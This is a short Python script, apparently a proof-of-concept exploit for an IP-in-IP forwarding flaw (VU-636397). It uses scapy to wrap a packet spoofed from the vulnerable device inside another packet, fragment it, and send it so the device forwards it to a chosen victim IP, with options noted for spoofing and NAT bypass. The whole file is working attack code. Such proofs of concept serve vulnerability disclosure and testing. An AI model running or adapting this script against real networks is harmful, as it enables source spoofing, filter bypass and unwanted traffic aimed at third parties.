#!/usr/bin/env python3
import sys
from scapy.all import *
if len(sys.argv) < 3:
    print("Usage "+sys.argv[0]+" VULNERABLE_MACHINE_IP VICTIM_IP [DATA_COLLECT_IP] [spoof|bypass]")
    print("\t - Optional arguments DATA_COLLECT_IP and bypass can be used to bypass NAT")
    sys.exit(0);
## IP-in-IP forwarding device vulnerable to VU-636397
VULNERABLE_MACHINE_IP = sys.argv[1]
## VICTIM IP of the machine we want to send packet to
VICTIM_IP = sys.argv[2]

packet = IP(dst=VULNERABLE_MACHINE_IP)/IP(src=VULNERABLE_MACHINE_IP, dst=VICTIM_IP)/UDP(sport=3363, dport=3363)/Raw(load="I am Vulnerable"*20)
frags=fragment(packet,fragsize=50)
## To see the packets in the DATA_COLLECTOR or  VICTIM_IP execute:
## tcpdump -i any -nvvv udp port 3363
for fragment in frags:
    fragment.show()
    send(fragment)

